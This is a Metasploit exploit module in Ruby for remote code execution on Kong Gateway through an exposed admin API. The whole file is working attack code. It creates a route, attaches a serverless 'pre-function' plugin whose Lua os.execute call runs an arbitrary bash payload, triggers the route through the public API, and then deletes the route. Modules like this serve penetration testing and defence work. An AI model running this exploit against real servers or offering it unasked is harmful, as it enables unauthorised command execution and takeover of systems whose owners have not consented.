# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Kong Gateway Admin API Remote Code Execution',
      'Description' => '
        This module uses the Kong admin API to create a route and a serverless function plugin that is associated with
        the route. The plugin runs Lua code and is used to run a system command using os.execute(). After execution the
        route is deleted, which also deletes the plugin.',
      'License' => MSF_LICENSE,
      'Author' => ['Graeme Robinson'],
      'References' =>
      [
        ['URL', 'https://konghq.com/'],
        ['URL', 'https://github.com/Kong/kong'],
        ['URL', 'https://docs.konghq.com/hub/kong-inc/serverless-functions/']
      ],
      'Platform' => %w[linux macos],
      'Arch' => [ARCH_X86, ARCH_X64],
      'Targets' =>
      [
        ['Unix (In-Memory)',
         'Platform' => 'unix',
         'Arch' => ARCH_CMD,
         'Type' => :unix_memory]
      ],
      'Privileged' => false,
      'DisclosureDate' => 'Oct 13 2020',
      'DefaultOptions' => {
        'RPORT' => 8001
      },
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
      }
    ))
    register_options(
      [
        OptString.new('PUBLIC-API-RHOST', [false, 'The host where the public API is available, if different to RHOST']),
        OptInt.new('PUBLIC-API-RPORT', [true, 'The port where the public API is available', 8000])
      ],
      self.class
    )
  end

  def check_response(response, expected, path, description)
    return Failure::Unreachable, "No response received from #{path} when #{description}" unless response
    return if response.code == expected

    [Failure::UnexpectedReply,
     "Unexpected response from #{path} when #{description} (recieved #{response.code}, expected #{expected})"]
  end

  def create_route(name)
    path = normalize_uri('routes')
    response = send_request_cgi({ 'method' => 'POST', 'uri' => path,
                                  'vars_post' => { 'name' => name, 'paths' => '/' + name } })
    failure_type, description = check_response(response, 201, path, 'creating route')
    return unless failure_type

    print_warning("Failure creating route #{name}. Will attempt to delete route #{name}")
    delete_route(name)
    # Had to implement this in this way instead of just doing fail_with(failure_type, description) because  otherwise
    # msftidy checks fail
    fail_with(Failure::Unreachable, description) if failure_type == Failure::Unreachable
    fail_with(Failure::UnexpectedReply, description) if failure_type == Failure::UnexpectedReply
  end

  def create_plugin(name)
    # The double square brackets helps to ensure single/double quotes in cmd payload do not interfere with syntax of
    # os.execute Lua function. The ampersand backgrounds the command so that it doesn't cause Kong to hang.
    cmd = %{os.execute([[bash -c "#{payload.encoded}" &]])}

    # If users want to troubleshoot their cmd payloads, they can see the Lua function with params that the module uses
    # in a more verbose mode.
    vprint_status("Now executing the following command: #{cmd}")

    path = normalize_uri('routes', name, 'plugins')
    response = send_request_cgi({ 'method' => 'POST', 'uri' => path,
                                  'vars_post' => { 'name' => 'pre-function', 'config.access' => cmd } })
    failure_type, description = check_response(response, 201, path, 'creating plugin')
    return unless failure_type

    print_warning("Failure creating plugin for route #{name}. Will attempt to delete route #{name}")
    delete_route(name)
    # Had to implement this in this way instead of just doing fail_with(failure_type, description) because  otherwise
    # msftidy checks fail
    fail_with(Failure::Unreachable, description) if failure_type == Failure::Unreachable
    fail_with(Failure::UnexpectedReply, description) if failure_type == Failure::UnexpectedReply
  end

  def request_route(name)
    path = normalize_uri(name)
    rhost = datastore['PUBLIC-API-RHOST'] if datastore['PUBLIC-API-RHOST']
    rport = datastore['PUBLIC-API-RPORT'] if datastore['PUBLIC-API-RPORT']
    response = send_request_cgi({ 'uri' => path, 'rhost' => rhost, 'rport' => rport })
    failure_type, description = check_response(response, 503, path, 'requesting route')
    return unless failure_type

    print_warning("Failure requesting route #{name}. Will attempt to delete route #{name}")
    delete_route(name)
    # Had to implement this in this way instead of just doing fail_with(failure_type, description) because  otherwise
    # msftidy checks fail
    fail_with(Failure::Unreachable, description) if failure_type == Failure::Unreachable
    fail_with(Failure::UnexpectedReply, description) if failure_type == Failure::UnexpectedReply
  end

  def delete_route(name)
    path = normalize_uri('routes', name)

    # Delete it
    response = send_request_cgi({ 'method' => 'DELETE', 'uri' => path })
    failure_type, description = check_response(response, 204, path, 'deleting route')
    # Had to implement this in this way instead of just doing fail_with(failure_type, description) because  otherwise
    # msftidy checks fail
    fail_with(Failure::Unreachable, description) if failure_type == Failure::Unreachable
    fail_with(Failure::UnexpectedReply, description) if failure_type == Failure::UnexpectedReply

    # Check Whether it deleted
    response = send_request_cgi({ 'uri' => path })
    failure_type, description = check_response(response, 404, path, 'verifying that route has been deleted')
    # Had to implement this in this way instead of just doing fail_with(failure_type, description) because  otherwise
    # msftidy checks fail
    fail_with(Failure::Unreachable, description) if failure_type == Failure::Unreachable
    fail_with(Failure::UnexpectedReply, description) if failure_type == Failure::UnexpectedReply
  end

  def check
    # Check admin API
    response = send_request_cgi
    return CheckCode::Unknown unless response
    return CheckCode::Safe unless response.get_json_document['tagline'] == 'Welcome to kong'

    # Check public API
    rhost = datastore['PUBLIC-API-RHOST'] if datastore['PUBLIC-API-RHOST']
    rport = datastore['PUBLIC-API-RPORT'] if datastore['PUBLIC-API-RPORT']
    path = normalize_uri(rand_text_alphanumeric(10))
    response = send_request_cgi({ 'rport' => rport, 'rhost' => rhost, 'uri' => path })
    return CheckCode::Unknown unless response
    return CheckCode::Safe unless response.get_json_document['message'] == 'no Route matched with those values'

    CheckCode::Appears
  end

  def exploit
    fail_with(Failure::UnexpectedReply, 'Admin API not detected') unless check == CheckCode::Appears
    name = rand_text_alphanumeric(10)
    create_route(name)
    vprint_good("Created route #{name}")
    create_plugin(name)
    vprint_good("Created plugin for route #{name}")
    request_route(name)
    vprint_good("Requested route #{name} using public API")
    delete_route(name)
    vprint_good("Deleted route #{name}")
  end
end
